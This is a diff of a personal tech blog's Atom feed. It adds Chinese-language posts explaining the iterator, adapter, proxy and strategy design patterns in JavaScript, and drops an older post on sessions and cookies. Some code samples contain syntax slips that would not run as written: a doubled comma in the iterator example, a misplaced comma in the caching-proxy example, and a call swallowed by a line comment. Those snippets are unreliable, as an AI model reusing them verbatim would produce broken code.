@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoohannah.github.io/"/>
-  <updated>2018-11-04T16:07:22.772Z</updated>
+  <updated>2018-11-06T14:34:07.004Z</updated>
   <id>http://yoohannah.github.io/</id>
   
   <author>
@@ -14,6 +14,113 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>迭代器模式</title>
+    <link href="http://yoohannah.github.io/post/designMode/iterator.html"/>
+    <id>http://yoohannah.github.io/post/designMode/iterator.html</id>
+    <published>2018-11-06T14:23:09.000Z</published>
+    <updated>2018-11-06T14:34:07.004Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>提供一种方法顺序访问一个聚合对象种的各个元素，而又不需要暴露该对象的内部表示<br>把迭代过程从业务逻辑中分离出来，不用关心对象的内部构造，可以按顺序访问其中的每个元素</p>
+<h1 id="用途-场景"><a href="#用途-场景" class="headerlink" title="用途/场景"></a>用途/场景</h1><p>查找可用组件，进行数据处理</p>
+<h1 id="主要思想"><a href="#主要思想" class="headerlink" title="主要思想"></a>主要思想</h1><p>内部迭代器<br>函数内部定义好迭代规则，完全接手整个迭代过程，外部只需要一次初始调用</p>
+<p>外部迭代器<br>需要调用进行下一轮迭代的函数，可以手工控制迭代的过程或者顺序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">//使用内部迭代器实现</div><div class="line">var iteratorInner=(arr,fn)=&gt;&#123;</div><div class="line">	for(let i=0;i&lt;arr.length;i++)&#123;</div><div class="line">		fn(arr,i)</div><div class="line">	&#125;</div><div class="line">	return arr</div><div class="line">&#125;</div><div class="line">console.log(iteratorInner([1,2,3],(arr,i)=&gt;&#123;arr[i]++&#125;)) //[2,3,4] </div><div class="line"></div><div class="line">//使用外部迭代器</div><div class="line">let iteratorOuter = (arr,fn)=&gt;&#123;</div><div class="line">	let count = 0;</div><div class="line">    let nextFn =()=&gt;&#123;</div><div class="line">		if(count &lt;arr.length)&#123;</div><div class="line">			fn(arr,count)</div><div class="line">		&#125;</div><div class="line">		return &#123;</div><div class="line">			result:arr,</div><div class="line">			count:count === arr.length ? count:++count,,</div><div class="line">			done:count === arr.length</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return &#123;</div><div class="line">		next:nextFn,</div><div class="line">		isdone:count === arr.length</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">var it = iteratorOuter([1,2,3],(arr,i)=&gt;&#123;</div><div class="line">	arr[i]++</div><div class="line">&#125;)</div><div class="line">console.log(it.next())</div><div class="line">//count: 1</div><div class="line">//done: false</div><div class="line">//result: (3) [2, 3, 4]</div><div class="line">console.log(it.next())</div><div class="line">//count: 2</div><div class="line">//done: false</div><div class="line">//result: (3) [2, 3, 4]</div><div class="line">console.log(it.next())</div><div class="line">//count: 3</div><div class="line">//done: true</div><div class="line">//result: (3) [2, 3, 4]</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h1&gt;&lt;p&gt;提供一种方法顺序访问一个聚合对象种的各个元素，而又不需要暴露该对象的内部表示&lt;br&gt;把迭代过程从业务逻辑中分离出来，不用关心对象的内部构造，
+    
+    </summary>
+    
+    
+      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>适配器模式</title>
+    <link href="http://yoohannah.github.io/post/designMode/adapter.html"/>
+    <id>http://yoohannah.github.io/post/designMode/adapter.html</id>
+    <published>2018-11-06T14:11:09.000Z</published>
+    <updated>2018-11-06T14:05:40.479Z</updated>
+    
+    <content type="html"><![CDATA[<p>定义<br>解决俩个软件实体间接口不兼容的问题，使用适配器模式之后，原本由于接口不兼容而不能工作的两个软件实体，可以一起工作</p>
+<p>用途/场景<br>1.调用第三方（地图/支付）接口时，不同平台提供的相同功能的接口函数名不同，或者调用时需要进行的操作过程不同，<br>  将这些过程封装/分类，通过适配器决定如何使用</p>
+<p>2.处理数据,将不符合使用要求的数据结构转换成预期的样子</p>
+<p>主要思想<br>将处理过程封装在适配器函数中,直接在适配器函数中进行处理，或者让适配器返回处理后的可适用结果<br>调用适配器传入需要处理的数据/条件，适配器进行处理或返回处理结果</p>
+<p>注意事项<br>那些繁琐的处理代码始终是存在的，只不过在写业务的时候看不到它罢了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">1.转换数据结构</div><div class="line">//将如下数据结构</div><div class="line">var guangdongCity = [&#123;             </div><div class="line">        name: &apos;shenzhen&apos;,             </div><div class="line">        id: 11,         </div><div class="line">    &#125;, &#123;             </div><div class="line">        name: &apos;guangzhou&apos;,             </div><div class="line">        id: 12,         </div><div class="line">    &#125;];</div><div class="line">//转换成如下数据结构</div><div class="line">var guangdongCity = &#123;     shenzhen: 11,      guangzhou: 12&#125;;</div><div class="line"></div><div class="line">var adapter = (data)=&gt;&#123;</div><div class="line">	let temp = &#123;&#125;;</div><div class="line">	for(let i=0;i&lt;data.length;i++)&#123;</div><div class="line">		temp[data[i].name] = data[i].id</div><div class="line">	&#125;</div><div class="line">	return temp</div><div class="line">&#125;</div><div class="line">console.log(adapter(guangdongCity))</div><div class="line"></div><div class="line">2.SDK适配例子1</div><div class="line">var googleMap = &#123;      </div><div class="line">    show: function()&#123;          </div><div class="line">        console.log( &apos;开始渲染谷歌地图&apos; );      </div><div class="line">        &#125;  </div><div class="line">    &#125;; </div><div class="line">var baiduMap = &#123;       </div><div class="line">        display: function()&#123;          </div><div class="line">            console.log( &apos;开始渲染百度地图&apos; );      </div><div class="line">        &#125;  </div><div class="line">    &#125;; </div><div class="line">var baiduMapAdapter = &#123;      </div><div class="line">        show: function()&#123;          </div><div class="line">            return baiduMap.display();    </div><div class="line">        &#125;  </div><div class="line">    &#125;;</div><div class="line">var renderMap = function( map )&#123;     </div><div class="line">    if ( map.show instanceof Function )&#123;         </div><div class="line">        map.show();     </div><div class="line">    &#125; </div><div class="line">&#125;; </div><div class="line">renderMap( googleMap );        // 输出：开始渲染谷歌地图 </div><div class="line">renderMap( baiduMapAdapter );    // 输出：开始渲染百度地图 </div><div class="line">3.SDK适配例子2</div><div class="line">function pay (&#123;</div><div class="line">  price,</div><div class="line">  goodsId</div><div class="line">&#125;) &#123;</div><div class="line">  return new Promise((resolve, reject) =&gt; &#123;</div><div class="line">    const config = &#123;&#125;</div><div class="line"> </div><div class="line">    switch (platform) &#123;</div><div class="line">      case &apos;wechat&apos;:</div><div class="line">        // 微信的处理逻辑</div><div class="line">        config.price = price</div><div class="line">        config.goodsId = goodsId</div><div class="line">        config.appId = &apos;XXX&apos;</div><div class="line">        config.secretKey = &apos;XXX&apos;</div><div class="line">        wx.pay(config).then((err, data) =&gt; &#123;</div><div class="line">          if (err) return reject(err)</div><div class="line"> </div><div class="line">          resolve(data)</div><div class="line">        &#125;)</div><div class="line">      break</div><div class="line">      case &apos;QQ&apos;:</div><div class="line">        // QQ的处理逻辑</div><div class="line">        config.price = price * 100</div><div class="line">        config.gid = goodsId</div><div class="line">        config.appId = &apos;XXX&apos;</div><div class="line">        config.secretKey = &apos;XXX&apos;</div><div class="line">        config.success = resolve</div><div class="line">        config.error = reject</div><div class="line">        qq.pay(config)</div><div class="line">      break</div><div class="line">      case &apos;alipay&apos;:</div><div class="line">        // 支付宝的处理逻辑</div><div class="line">        config.payment = price</div><div class="line">        config.id = goodsId</div><div class="line">        config.token = &apos;XXX&apos;</div><div class="line">        alipay.pay(config, resolve, reject)</div><div class="line">      break</div><div class="line">    &#125;</div><div class="line">  &#125;)</div><div class="line">&#125;</div><div class="line">// run anywhere</div><div class="line">await pay(&#123;</div><div class="line">  price: 10,</div><div class="line">  goodsId: 1</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
+<p>对于SDK提供方，仅仅需要知道自己所需要的一些参数，然后按照自己的方式进行数据返回。</p>
+<p>对于SDK调用方，仅仅需要我们约定好的通用的参数，以及按照约定的方式进行监听回调处理。</p>
+<p>整合多个第三方SDK的任务交由适配器来做，然后将适配器的代码压缩，混淆，放在一个看不见的角落里去，这样的代码逻辑就会变得很清晰了<br>参考资料:<a href="https://mp.weixin.qq.com/s/QRqeDCzD0APyj2g7BNqtpg" target="_blank" rel="external">适配器在JavaScript中的体现</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;定义&lt;br&gt;解决俩个软件实体间接口不兼容的问题，使用适配器模式之后，原本由于接口不兼容而不能工作的两个软件实体，可以一起工作&lt;/p&gt;
+&lt;p&gt;用途/场景&lt;br&gt;1.调用第三方（地图/支付）接口时，不同平台提供的相同功能的接口函数名不同，或者调用时需要进行的操作过程不同，&lt;br
+    
+    </summary>
+    
+    
+      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>代理模式</title>
+    <link href="http://yoohannah.github.io/post/designMode/proxy.html"/>
+    <id>http://yoohannah.github.io/post/designMode/proxy.html</id>
+    <published>2018-11-06T14:10:09.000Z</published>
+    <updated>2018-11-06T14:17:52.466Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>保护代理<br>代理B可以帮助A过滤掉一些请求，可以直接在代理B中拒绝掉<br>用于控制不同权限的对象对目标对象的访问</p>
+<p>虚拟代理<br>把一些开销很大的对象，延迟到真正需要它的时候才去创建</p>
+<h1 id="单一职责原则"><a href="#单一职责原则" class="headerlink" title="单一职责原则"></a>单一职责原则</h1><p>就一个类（通常也包括对象和函数）而言，应该仅有一个引起它变化的原因。</p>
+<h1 id="主要思想"><a href="#主要思想" class="headerlink" title="主要思想"></a>主要思想</h1><p>A想调用C，要经过B，B在中间做C的代理，用于判断什么时候可以执行C<br>比如多次调用缓存起来再一起执行C；传入相同参数只计算一次，将结果保存，以后传入相同参数直接返回结果，不再计算</p>
+<h1 id="用途-实现"><a href="#用途-实现" class="headerlink" title="用途/实现"></a>用途/实现</h1><p>1.虚拟代理合并 HTTP请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">//可以通过一个代理函数 proxySynchronousFile 来收集一段时间之内的请求， 后一次性发送给服务器。</div><div class="line">var synchronousFile = function( id )&#123;     </div><div class="line">    console.log( &apos;开始同步文件，id 为: &apos; + id ); </div><div class="line">&#125;; </div><div class="line"> </div><div class="line">var proxySynchronousFile = (function()&#123;     </div><div class="line">    var cache = [],    // 保存一段时间内需要同步的 ID         </div><div class="line">    timer;    // 定时器 </div><div class="line">    return function( id )&#123;         </div><div class="line">        cache.push( id );  //每次进来收集       </div><div class="line">        if ( timer )&#123;    </div><div class="line">            // 保证不会覆盖已经启动的定时器             </div><div class="line">            return;         </div><div class="line">        &#125; </div><div class="line">        timer = setTimeout(function()&#123;             </div><div class="line">            synchronousFile( cache.join( &apos;,&apos; ) );    // 2 秒后向本体发送需要同步的 ID 集合 到时间统一处理           clearTimeout( timer );    // 清空定时器             </div><div class="line">            timer = null;             </div><div class="line">            cache.length = 0; // 清空 ID 集合         </div><div class="line">            &#125;, 2000 );     </div><div class="line">        &#125; </div><div class="line">    &#125;)(); </div><div class="line">var checkbox = document.getElementsByTagName( &apos;input&apos; ); </div><div class="line">for ( var i = 0, c; c = checkbox[ i++ ]; )&#123; </div><div class="line">     c.onclick = function()&#123;         </div><div class="line">        if ( this.checked === true )&#123;             </div><div class="line">            proxySynchronousFile( this.id );         </div><div class="line">        &#125;     </div><div class="line">    &#125; </div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>2.缓存代理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">var mult = function()&#123;     </div><div class="line">    console.log( &apos;开始计算乘积&apos; );     </div><div class="line">    var a = 1;     </div><div class="line">    for ( var i = 0, l = arguments.length; i &lt; l; i++ )&#123;         </div><div class="line">        a = a * arguments[i];      </div><div class="line">    &#125;      </div><div class="line">    return a; </div><div class="line">&#125;; </div><div class="line">// 创建缓存代理的工厂 </div><div class="line">var createProxyFactory = function( fn )&#123;     </div><div class="line">    var cache = &#123;&#125;;     </div><div class="line">    return function()&#123;         </div><div class="line">        var args = Array.prototype.join.call( arguments, &apos;,&apos; );         </div><div class="line">        if ( args in cache )&#123;             </div><div class="line">            return cache[ args ];         </div><div class="line">            &#125;         </div><div class="line">        return  cache[ args ] = fn.apply( this, arguments );     </div><div class="line">    &#125; </div><div class="line">&#125;; </div><div class="line">var proxyMult = createProxyFactory( mult ), </div><div class="line"> proxyMult( 1, 2, 3, 4 );    // 输出：24  </div><div class="line"> proxyMult( 1, 2, 3, 4 );    // 输出：24</div></pre></td></tr></table></figure></p>
+<p>扩展：用于ajax异步请求数据，下次请求相同数据时，是否可以取消请求，直接用之前缓存的数据，适用固定数据</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h1&gt;&lt;p&gt;保护代理&lt;br&gt;代理B可以帮助A过滤掉一些请求，可以直接在代理B中拒绝掉&lt;br&gt;用于控制不同权限的对象对目标对象的访问&lt;/p&gt;
+&lt;p&gt;虚拟代
+    
+    </summary>
+    
+    
+      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>策略模式</title>
+    <link href="http://yoohannah.github.io/post/designMode/strategies.html"/>
+    <id>http://yoohannah.github.io/post/designMode/strategies.html</id>
+    <published>2018-11-06T14:09:09.000Z</published>
+    <updated>2018-11-06T14:19:26.280Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="主要思想"><a href="#主要思想" class="headerlink" title="主要思想"></a>主要思想</h1><p>定义一系列的算法，把它们一个个封装起来，通过逻辑函数使他们可以相互替换<br>避免if-else多分支判断</p>
+<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><p>定义一些系列算法（具体处理过程），把他们各自封装成策略类，算法被封装在策略类内部方法里。在客户对Context(如何调用算法的处理函数)发起请求时，Context总是把请求委托给这些策略对象中间的某一个进行计算</p>
+<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>编写代理函数时，注意如何调用，让算法得到<b>执行</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">let strategies = &#123; //算法集合</div><div class="line">	 &quot;S&quot;: function( salary )&#123; </div><div class="line">        return salary * 4;     </div><div class="line">		&#125;,</div><div class="line">     &quot;A&quot;: function( salary )&#123;</div><div class="line">         return salary * 3;</div><div class="line">     &#125;,</div><div class="line">     &quot;B&quot;: function( salary )&#123;</div><div class="line">         return salary * 2;</div><div class="line">     &#125;</div><div class="line"> &#125;; </div><div class="line">var calculateBonus = function( level, salary )&#123; //Context,委托函数，负责调用哪个算法</div><div class="line">     return strategies[ level ]( salary ); </div><div class="line">&#125;;</div><div class="line"> </div><div class="line">console.log( calculateBonus( &apos;S&apos;, 20000 ) );//80000</div><div class="line">console.log( calculateBonus( &apos;A&apos;, 10000 ) );//30000</div><div class="line"></div><div class="line">变形：</div><div class="line">var S = function( salary )&#123;      return salary * 4;  &#125;; </div><div class="line">var A = function( salary )&#123;     return salary * 3; &#125;; </div><div class="line">var B = function( salary )&#123;     return salary * 2; &#125;; </div><div class="line">var calculateBonus = function( func, salary )&#123;     return func( salary ); &#125;; </div><div class="line">calculateBonus( S, 10000  )</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">//具体策略方法</div><div class="line"> var strategies = &#123;             </div><div class="line">     isNonEmpty: function( value, errorMsg )&#123;                 </div><div class="line">         if ( value === &apos;&apos; )&#123;                     </div><div class="line">             return errorMsg;                 </div><div class="line">        &#125;             </div><div class="line">    &#125;,             </div><div class="line">    minLength: function( value, length, errorMsg )&#123;                 </div><div class="line">        if ( value.length &lt; length )&#123;                     </div><div class="line">            return errorMsg;                 </div><div class="line">        &#125;             </div><div class="line">    &#125;,             </div><div class="line">    isMobile: function( value, errorMsg )&#123;                 </div><div class="line">        if ( !/(^1[3|5|8][0-9]&#123;9&#125;$)/.test( value ) )&#123;                     </div><div class="line">            return errorMsg;                 </div><div class="line">        &#125;             </div><div class="line">    &#125;         </div><div class="line">&#125;; </div><div class="line">//执行代理 Context</div><div class="line"> var Validator = function()&#123;             </div><div class="line">        this.cache = [];         </div><div class="line">     &#125;; </div><div class="line"></div><div class="line">    Validator.prototype.add = function( dom, rules )&#123; </div><div class="line">        var self = this;</div><div class="line">        for ( var i = 0, rule; rule = rules[ i++ ]; )&#123;                 </div><div class="line">            (function( rule )&#123;                     </div><div class="line">                var strategyAry = rule.strategy.split( &apos;:&apos; );                     </div><div class="line">                var errorMsg = rule.errorMsg; </div><div class="line">                self.cache.push(function()&#123;                         </div><div class="line">                    var strategy = strategyAry.shift(); </div><div class="line">                    strategyAry.unshift( dom.value );                       </div><div class="line">                    strategyAry.push( errorMsg ); //strategyAry，传递到具体算法函数参数，这里进行处理          </div><div class="line">                    return strategies[ strategy ].apply( dom, strategyAry );                     </div><div class="line">                &#125;);                 </div><div class="line">            &#125;)( rule )             </div><div class="line">        &#125; </div><div class="line">    &#125;; </div><div class="line">    Validator.prototype.start = function()&#123;             </div><div class="line">        for ( var i = 0, validatorFunc; validatorFunc = this.cache[ i++ ]; )&#123;                 </div><div class="line">            var errorMsg = validatorFunc();                 </div><div class="line">            if ( errorMsg )&#123;                     </div><div class="line">                return errorMsg;                 </div><div class="line">            &#125;             </div><div class="line">        &#125;         </div><div class="line">    &#125;;</div><div class="line">//具体应用</div><div class="line">    var registerForm = document.getElementById( &apos;registerForm&apos; ); </div><div class="line">    var validataFunc = function()&#123;             </div><div class="line">        var validator = new Validator(); </div><div class="line">        validator.add( registerForm.userName, [&#123;                 </div><div class="line">            strategy: &apos;isNonEmpty&apos;,                 </div><div class="line">            errorMsg: &apos;用户名不能为空&apos;             </div><div class="line">        &#125;, &#123;                 </div><div class="line">            strategy: &apos;minLength:6&apos;,                </div><div class="line">            errorMsg: &apos;用户名长度不能小于 10 位&apos;             </div><div class="line">        &#125;]); </div><div class="line">        validator.add( registerForm.password, [&#123;                 </div><div class="line">            strategy: &apos;minLength:6&apos;,                 </div><div class="line">            errorMsg: &apos;密码长度不能小于 6 位&apos;             </div><div class="line">        &#125;]); </div><div class="line">        validator.add( registerForm.phoneNumber, [&#123;                 </div><div class="line">            strategy: &apos;isMobile&apos;,                 </div><div class="line">            errorMsg: &apos;手机号码格式不正确&apos;             </div><div class="line">        &#125;]); </div><div class="line">        var errorMsg = validator.start();             </div><div class="line">        return errorMsg;         </div><div class="line">    &#125; </div><div class="line">    registerForm.onsubmit = function()&#123;                  </div><div class="line">        var errorMsg = validataFunc(); </div><div class="line">        if ( errorMsg )&#123;                   </div><div class="line">            alert ( errorMsg );                   </div><div class="line">            return false;              </div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;主要思想&quot;&gt;&lt;a href=&quot;#主要思想&quot; class=&quot;headerlink&quot; title=&quot;主要思想&quot;&gt;&lt;/a&gt;主要思想&lt;/h1&gt;&lt;p&gt;定义一系列的算法，把它们一个个封装起来，通过逻辑函数使他们可以相互替换&lt;br&gt;避免if-else多分支判断&lt;/p&gt;
+&lt;h1 
+    
+    </summary>
+    
+    
+      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
+    
+  </entry>
   
   <entry>
     <title>单例模式</title>
@@ -45,8 +152,8 @@
     <title>基础知识</title>
     <link href="http://yoohannah.github.io/post/designMode/basic.html"/>
     <id>http://yoohannah.github.io/post/designMode/basic.html</id>
-    <published>2018-11-02T23:37:09.000Z</published>
-    <updated>2018-11-03T15:22:22.084Z</updated>
+    <published>2018-11-03T08:37:09.000Z</published>
+    <updated>2018-11-06T14:05:51.043Z</updated>
     
     <content type="html"><![CDATA[<h1 id="一些有思想提醒作用的话"><a href="#一些有思想提醒作用的话" class="headerlink" title="一些有思想提醒作用的话"></a>一些有思想提醒作用的话</h1><p>把不变的部分隔离出来，把可变的部分封装起来</p>
 <p>多态最根本的作用就是通过把过程化的条件分支语句转化为对象的多态性，从而消除这些条件分支语句</p>
@@ -527,135 +634,6 @@
     
       &lt;h1 id=&quot;js单线程&quot;&gt;&lt;a href=&quot;#js单线程&quot; class=&quot;headerlink&quot; title=&quot;js单线程&quot;&gt;&lt;/a&gt;js单线程&lt;/h1&gt;&lt;p&gt;同一时间只干一件事，干完一件事再干下一件事，&lt;br&gt;如果前一个任务耗时很长，后一个任务也得一直等着&lt;/p&gt;
 &lt;p&gt;为
-    
-    </summary>
-    
-    
-      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>session 和cookie</title>
-    <link href="http://yoohannah.github.io/post/knowledge/session&amp;cookie.html"/>
-    <id>http://yoohannah.github.io/post/knowledge/session&amp;cookie.html</id>
-    <published>2017-12-28T00:17:15.000Z</published>
-    <updated>2017-12-28T00:17:29.491Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="正常情况下身份识别"><a href="#正常情况下身份识别" class="headerlink" title="正常情况下身份识别"></a>正常情况下身份识别</h1><p>用户提交登录信息，服务器拿到登录信息进行验证之后，<br>为该用户在session表中建立唯一sessionid,然后在返回响应的时候，将sessionid放在set-cookie中告诉浏览器，将sessionid 放在cookie表中，下次请求的时候放在cookie中再发给我<br>这样用户在已登录的状态下进行的访问请求,浏览器都会在报文中将sessionid放在cookie中给回服务器<br>服务器拿到cookie 就能判断用户是否进行了登录，并根据session表确定登录身份</p>
-<h1 id="session-机制"><a href="#session-机制" class="headerlink" title="session 机制"></a>session 机制</h1><p>当用户访问服务器时,服务器就会先检查请求有没有带sessionid,<br>如果没带的话,就为该用户在session列表中建立一个session，<br>(这个session是存储特定用户会话所需的属性及配置信息的一个对象，开发人员可以控制里面是什么内容，可以自定义的)<br>并生成唯一sessionid通过set-cookie给回用户<br>如果有带的话,就根据sessionid 在列表中查找对应的session,将session 取出来使用，如果没找到则可能新建一个</p>
-<p>1.浏览器禁用cookie解决办法<br>让浏览器重写url：将sessionid 以参数或者附加信息方式放在url后面传递给服务器<br>表单隐藏字段：服务器在返回表单的时候就将sessionid 以隐藏字段方式给过去,客户端提交表单的时候就一并传回来</p>
-<p>2.session什么时候被删除<br>过期就会自动删除<br>执行特定删除命令的时候，比如注销<br>session存在内存中的时候，当服务器被重启或者停止时，session列表会被清空</p>
-<p>3.session存储<br>一般存在内存中，但服务器重启或者停止会被清空<br>如果想持久保存，可以放在硬盘里面，这样服务器重启或者停止不会被清空</p>
-<h1 id="cookie-机制"><a href="#cookie-机制" class="headerlink" title="cookie 机制"></a>cookie 机制</h1><p>浏览器拿到set-cookie后，会根据sessionid ,域名，路径等相关信息，生成cookie，存到cookie列表中<br>当用户要请求服务器时，就根据请求资源路径去查cookie表，找到的cookie可用的范围如果大于等于请求路径,<br>就将cookie放在请求头给回服务器</p>
-<p>1.cookie存储<br>会话cookie存储在内存中，页面关闭就删除<br>设置了过期时间的cookie,会被存储在硬盘上，直到超过设定时间才会被删除</p>
-<p>2.cookie与浏览器<br>存储在硬盘上的cookie可以在不同浏览器进程间共享<br>对于内存上的cookie不同浏览器有不同处理方式<br>IE通过 ctrl+N 的方式打开的窗口可以与原窗口共享cookie,但其他方式不行<br>而火狐的所有进程和标签页都可以共享cookie</p>
-<p>一般情况下通过js window.open打开的窗口会与原窗口共享内存cookie</p>
-<h1 id="游客识别跟踪"><a href="#游客识别跟踪" class="headerlink" title="游客识别跟踪"></a>游客识别跟踪</h1><p>用户未登录情况下进行页面请求，且之后都不进行登录操作的情况下，还要与用户保持可进行身份识别的通信，<br>这种情景解决办法可以有<br>A.<br>一般就需要依靠识别机器来识别用户了<br>首先给未登录用户设置访问用户cookie,<br>根据不同机型用canvas写字像素是不一样的原理<br>这个cookie由游客设备的各种机器特征码组合起来生成给到服务器，<br>服务器存起来<br>下次再访问的时候，就依靠客户端建立的cookie进行识别<br>或者将机器信息传给服务器，由服务器生成再传给浏览器</p>
